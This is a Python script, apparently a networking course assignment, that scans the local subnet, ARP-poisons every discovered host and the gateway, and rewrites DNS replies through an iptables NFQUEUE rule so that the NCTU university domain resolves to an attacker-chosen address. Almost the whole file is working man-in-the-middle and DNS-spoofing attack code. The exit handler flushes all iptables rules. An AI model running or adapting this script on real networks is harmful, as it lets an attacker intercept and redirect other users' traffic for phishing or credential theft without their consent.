#!/usr/bin/env python3

from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import netifaces as ni
import time

from threading import Thread
ni.ifaddresses('ens33')
my_ip = ni.ifaddresses('ens33')[2][0]['addr']
my_mac = ni.ifaddresses('ens33')[ni.AF_LINK][0]['addr']

ap_ip = ni.gateways()['default'][ni.AF_INET][0]

target_ip = ap_ip + '/24'
# IP Address for the destination
# create ARP packet
arp = ARP(pdst=target_ip)
# create the Ether broadcast packet
# ff:ff:ff:ff:ff:ff MAC address indicates broadcasting
ether = Ether(dst="ff:ff:ff:ff:ff:ff")
# stack them
packet = ether/arp

result =srp(packet, timeout=3, verbose=0)[0]

# a list of clients, we will fill this in the upcoming loop
clients = []
for sent, received in result:
    if received.psrc == ap_ip :
        ap_mac = received.hwsrc
    else:
        # for each response, append ip and mac address to `clients` list
        clients.append({'ip': received.psrc, 'mac': received.hwsrc})


# print clients
print("Available devices in the network:")
print("IP" + " "*18+"MAC")
for client in clients:
    print("{:16}    {}".format(client['ip'], client['mac']))


def spoof_all(c_ip, c_mac):
    packet = ARP(op=2, pdst=c_ip, hwdst=c_mac, psrc=ap_ip)
    packet2 = ARP(op=2, pdst=ap_ip, hwdst=ap_mac, psrc=c_ip)
    send(packet, verbose=False)
    send(packet2, verbose=False)

# DNS mapping records, feel free to add/modify this dictionary
# for example, google.com will be redirected to 192.168.1.100
dns_hosts = {
    b"www.nctu.edu.tw.": "140.113.207.246",
    b"nctu.edu.tw.": "140.113.207.246",
}

def process_packet(packet):
    """
    Whenever a new packet is redirected to the netfilter queue,
    this callback is called.
    """
    # convert netfilter queue packet to scapy packet
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        # if the packet is a DNS Resource Record (DNS reply)
        # modify the packet
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            # not UDP packet, this can be IPerror/UDPerror packets
            pass
        # set back as netfilter queue packet
        packet.set_payload(bytes(scapy_packet))
    # accept the packet
    packet.accept()


def modify_packet(packet):
    """
    Modifies the DNS Resource Record packet ( the answer part)
    to map our globally defined dns_hosts dictionary.
    For instance, whenver we see a google.com answer, this function replaces 
    the real IP address (172.217.19.142) with fake IP address (192.168.1.100)
    """
    # get the DNS question name, the domain name
    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        # if the website isn't in our record
        # we don't wanna modify that
        return packet
    # craft new answer, overriding the original
    # setting the rdata for the IP we want to redirect (spoofed)
    # for instance, google.com will be mapped to "192.168.1.100"
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    # set the answer count to 1
    packet[DNS].ancount = 1
    # delete checksums and length of import netfilterqueue
    # new calculations are required ( scapy will do automatically )
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    # return the modified packet
    return packet


if __name__ == "__main__":

    QUEUE_NUM = 0
    # insert the iptables FORWARD rule
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    # instantiate the netfilter queue
    queue = NetfilterQueue()
    print("##########################")
    print("###### DNS spoofing ######")
    print("##########################")
    try:
        while(1):
            for c in clients:

                spoof_all(c['ip'], c['mac'])
            time.sleep(1.5)
        # bind the queue number to our callback process_packet
        # and start it
            queue.bind(QUEUE_NUM, process_packet)
            queue.run()
    except KeyboardInterrupt:
        # if want to exit, make sure we
        # remove that rule we just inserted, going back to normal.
        os.system("iptables --flush")
        print("")
        print("")
        print("")
        print("##########################")
        print("###### Goodbye, TA! ######")
        print("##########################")
